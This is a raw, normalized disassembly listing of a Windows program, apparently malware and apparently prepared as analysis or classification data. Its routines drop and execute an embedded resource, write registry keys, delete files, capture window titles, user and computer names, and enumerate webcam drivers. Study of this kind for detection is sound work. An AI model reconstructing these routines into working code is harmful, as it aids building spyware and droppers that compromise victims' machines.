call sub_4055c8
jmp r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
sub_48bb34
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48bb7c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
push 0x14
call SystemParametersInfoA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bb83
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48bb8c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48bbd1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call PlaySoundA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bbd8
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48bbdc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48bc3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bc42
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48bc6c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48bd99
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48bd67
push [ fs : eax ]
mov [ fs : eax ] esp
call GetTickCount
mov ebx eax
mov eax [ rw-data ]
cdq
push edx
push eax
mov eax ebx
xor edx edx
call sub_4064c0
mov esi eax
mov eax esi
imul [ rw-data ]
sub ebx eax
mov eax [ rw-data ]
cdq
push edx
push eax
mov eax ebx
xor edx edx
call sub_4064c0
mov edi eax
mov eax edi
imul [ rw-data ]
sub ebx eax
mov eax [ rw-data ]
cdq
push edx
push eax
mov eax ebx
xor edx edx
call sub_4064c0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
imul [ rw-data ]
sub ebx eax
mov eax [ rw-data ]
cdq
push edx
push eax
mov eax ebx
xor edx edx
call sub_4064c0
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax esi
call sub_409d70
push [ ebp - 0xc ]
push r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_409d70
push [ ebp - 0x10 ]
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_409d70
push [ ebp - 0x14 ]
push r-xdata
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_409d70
push [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov edx 0x7
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bda0
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_405554
retn
sub_48bdcb
inc [ ebx ]
add [ eax ] al
add [ esi + 0x2f ] ch
popad
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
xor eax eax
push ebp
push sub_48bec8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
push eax
push ebx
push 0x0
call __imp_FindResourceA
mov esi eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
lea eax [ ebp - 0xc ]
call sub_489bb0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_405728
mov edx [ ebp - 0x10 ]
pop eax
call sub_405818
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call __imp_CreateFileA
mov edi eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push esi
push 0x0
call SizeofResource
push eax
push esi
push 0x0
call LoadResource
push eax
call LockResource
push eax
push edi
call WriteFile
push edi
call CloseHandle
push 0x5
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
call sub_489bb0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx ebx
call sub_405728
mov edx [ ebp - 0x18 ]
pop eax
call sub_405818
mov eax [ ebp - 0x14 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call __imp_ShellExecuteA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48becf
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_405554
retn
sub_48bee4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_48bf15
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push r-xdata
push r-xdata
push 0x0
call EnumResourceNamesA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_48bf2c
push ebx
push esi
mov esi eax
mov ebx 0xffffff8f
add ebx 0x3e8
mov eax 0x4
inc ebx
dec eax
jne r-xdata
dec ebx
mov edx esi
mov eax ebx
call sub_409d70
pop esi
pop ebx
retn
sub_48bf54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48c05c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405530
xor eax eax
push ebp
push sub_48c027
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf003f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov [ ebp - 0xc ] eax
mov edx 0x80000001
mov eax [ ebp - 0xc ]
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_4218e4
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_42230c
test al al
jne r-xdata
mov cl 0x1
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_4218e4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_422264
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_405530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_422068
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c063
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0xc ]
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_48c0a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48c18a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48c15e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf003f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx r-xdata
mov eax ebx
call sub_42230c
test al al
jne r-xdata
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422008
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx r-xdata
mov eax ebx
call sub_421808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c191
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48c21c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_48c2eb
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
or ebx 0xffffffff
cmp ebx 0x3
jle r-xdata
cmp eax 0x0
jne r-xdata
fld [ ebp - 0x8 ]
fdiv [ r-xdata ]
fstp [ ebp - 0x8 ]
fwait
inc ebx
fld [ ebp - 0x8 ]
call sub_40345c
cmp edx 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
fld [ ebp - 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
call sub_403420
fmul [ r-xdata ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
seta al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
fld [ ebp - 0x8 ]
fstp [ ebp - 0x20 ]
fwait
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x3
lea edx [ ebp - 0x14 ]
xor ecx ecx
pop eax
call sub_40af98
mov edx [ ebp - 0xc ]
mov ecx [ ebx * 4 + rw-data ]
mov eax esi
call sub_405864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c2f2
lea eax [ ebp - 0xc ]
call sub_405530
retn
fld [ ebp - 0x8 ]
fmul [ r-xdata ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_48c308
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48c3d3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48c3a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40a16c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48c396
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_40d218
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_40a7bc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_40a3ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c39d
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
sub_48c39d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c3da
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48c3e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_48c473
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx 0x4
mov edx ebx
call sub_408560
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4055c8
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call LoadLibraryA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c47a
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4060ac
retn
push r-xdata
push ebx
call GetProcAddress
call eax
push ebx
call FreeLibrary
sub_48c5d0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_48c601
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push r-xdata
push r-xdata
push 0x0
call EnumResourceNamesA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_48c618
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48c6d9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48c6b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x1e
call sub_403af4
lea eax [ ebp - 0x122 ]
xor ecx ecx
mov edx 0x100
call sub_403af4
lea eax [ ebp - 0x122 ]
mov edx [ ebp - 0x4 ]
call sub_40a928
xor eax eax
mov [ ebp - 0x22 ] eax
lea eax [ ebp - 0x122 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x1e ] 0x3
mov [ ebp - 0x12 ] 0x40
or [ ebp - 0x12 ] 0x10
or [ ebp - 0x12 ] 0x4
lea eax [ ebp - 0x22 ]
push eax
call SHFileOperationA
test eax eax
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c6e0
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48c6ec
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4 ]
push eax
call FileTimeToSystemTime
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x8 ]
call sub_40bc00
fstp [ esi ]
fwait
sub_48c72c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax ebx
call sub_4059dc
push eax
call CreateFileA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
push ebp
push sub_48c7d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetFileTime
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_48c6ec
test al al
je r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
mov edx edi
lea eax [ ebp - 0x18 ]
call sub_48c6ec
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
call sub_48c6ec
test al al
jne r-xdata
mov al 0x1
sub_48c7ec
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x11c ] ecx
mov [ ebp - 0x120 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48c8ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48c8af
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x105
lea eax [ ebp - 0x115 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetVolumeInformationA
lea eax [ ebp - 0x120 ]
lea edx [ ebp - 0x115 ]
mov ecx 0x105
call sub_4057a0
mov eax [ ebp - 0x120 ]
lea edx [ ebp - 0x11c ]
call sub_409b7c
cmp [ ebp - 0x11c ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x115 ]
call sub_40aaa8
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c8f3
lea eax [ ebp - 0x120 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_48c91c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48c9fa
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48c9cd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x104
push 0x0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x104
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetVolumeInformationA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test bl bl
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ca01
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
shr eax 0x10
movzx eax ax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x0
movzx eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x0
lea edx [ ebp - 0x24 ]
mov ecx 0x1
mov eax r-xdata
call sub_40af98
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_409e5c
jmp r-xdata
sub_48ca28
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48cacf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48caa2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x105
lea eax [ ebp - 0x115 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetVolumeInformationA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x115 ]
call sub_40aaa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48cad6
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48caf0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48cba6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48cb79
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48cbad
lea eax [ ebp - 0x4 ]
call sub_405530
retn
fild [ ebp - 0x10 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_48c21c
fild [ ebp - 0x18 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
call sub_48c21c
jmp r-xdata
sub_48cbc4
push ebx
push esi
add esp 0xfffffff4
mov esi eax
push esp
call GetSystemPowerStatus
movzx ebx [ esp + 0x1 ]
mov eax ebx
and al 0x1
cmp al 0x1
jne r-xdata
mov eax ebx
and al 0x2
cmp al 0x2
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
mov eax ebx
and al 0x4
cmp al 0x4
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
mov eax ebx
and al 0x8
cmp al 0x8
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
mov eax ebx
and al 0x80
cmp al 0x80
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
and bl 0xff
cmp bl 0xff
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
add esp 0xc
pop esi
pop ebx
retn
mov eax esi
mov edx r-xdata
call sub_405584
sub_48cc9c
push ebp
mov ebp esp
add esp 0xfffffaa0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x560 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0xc ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48cddc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_405530
lea eax [ ebp - 0x8 ]
call sub_405530
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48cde3
lea eax [ ebp - 0x560 ]
call sub_405530
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x15c ]
call sub_403770
mov eax [ rw-data ]
mov [ eax ] 0x0
mov edx 0x1
lea eax [ ebp - 0x15c ]
call sub_403e68
call sub_40305c
xor ebx ebx
mov edx [ ebp - 0xc ]
shl edx 0xa
lea eax [ ebp - 0x15c ]
call sub_403e90
call sub_40305c
mov eax edi
mov edx [ ebp - 0x8 ]
call sub_405584
lea eax [ ebp - 0x15c ]
call sub_403918
call sub_40305c
inc ebx
lea eax [ ebp - 0x560 ]
lea edx [ ebp - 0x55c ]
mov ecx 0x400
call sub_4057a0
mov edx [ ebp - 0x560 ]
lea eax [ ebp - 0x8 ]
call sub_405818
cmp esi ebx
jle r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x55c ]
xor ecx ecx
mov edx 0x400
call sub_403af4
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x55c ]
mov ecx 0x400
lea eax [ ebp - 0x15c ]
call sub_4038d8
call sub_40305c
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
sub_48cdec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_405620
pop esi
pop ebx
retn
sub_48ce08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48ce63
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ce6a
retn
mov eax rw-data
call sub_405530
mov eax rw-data
mov ecx 0x4
mov edx [ r-xdata ]
call sub_4060f8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4060f8
sub_48ce74
push ebx
add esp 0xfffffefc
mov ebx eax
mov [ esp ] 0x100
push esp
lea eax [ esp + 0x8 ]
push eax
call GetUserNameA
test eax eax
je r-xdata
mov eax ebx
call sub_405530
mov edx ebx
lea eax [ esp + 0x4 ]
call sub_40aaa8
jmp r-xdata
add esp 0x104
pop ebx
retn
sub_48ceb0
push ebx
add esp 0xfffffefc
mov ebx eax
mov [ esp ] 0x100
push esp
lea eax [ esp + 0x8 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov eax ebx
call sub_405530
mov edx ebx
lea eax [ esp + 0x4 ]
call sub_40aaa8
jmp r-xdata
add esp 0x104
pop ebx
retn
sub_48ceec
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x5
lea eax [ esp + 0x4 ]
push eax
push 0x5a
push 0x400
call GetLocaleInfoA
cmp eax 0x3
sete al
test al al
je r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
mov eax ebx
mov edx esp
call sub_405728
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_48cf38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_48cfa5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_405530
call GetForegroundWindow
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48cfac
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push ebx
call GetWindowTextLengthA
mov esi eax
inc esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_405c6c
push esi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetWindowTextA
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_409c20
sub_48cfb4
push ebp
mov ebp esp
add esp 0xfffffdec
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x210 ] edx
mov [ ebp - 0x214 ] edx
mov edi eax
xor eax eax
push ebp
push sub_48d07b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test bl bl
jne r-xdata
push [ edi ]
lea eax [ ebp - 0x210 ]
lea edx [ ebp - 0x105 ]
mov ecx 0x105
call sub_4057a0
push [ ebp - 0x210 ]
push r-xdata
lea eax [ ebp - 0x214 ]
lea edx [ ebp - 0x20a ]
mov ecx 0x105
call sub_4057a0
push [ ebp - 0x214 ]
push r-xdata
mov eax edi
mov edx 0x5
call sub_4058e0
inc esi
push 0x105
lea eax [ ebp - 0x20a ]
push eax
push 0x105
lea eax [ ebp - 0x105 ]
push eax
push esi
call capGetDriverDescriptionA
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48d082
lea eax [ ebp - 0x214 ]
mov edx 0x2
call sub_405554
retn
sub_48d0a4
push ebx
push esi
push ecx
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov esi eax
test esi esi
je r-xdata
xor ebx ebx
push esp
call GetCurrentProcess
push eax
call esi
test eax eax
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
cmp [ esp ] 0x1
sbb ebx ebx
inc ebx
jmp r-xdata
sub_48d0fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48d1d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_48d1b6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48d189
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0x10 ]
call sub_4217a0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4218e4
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_422068
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48d1bd
mov eax [ ebp - 0x10 ]
call sub_404650
retn
sub_48d2fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_48d359
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
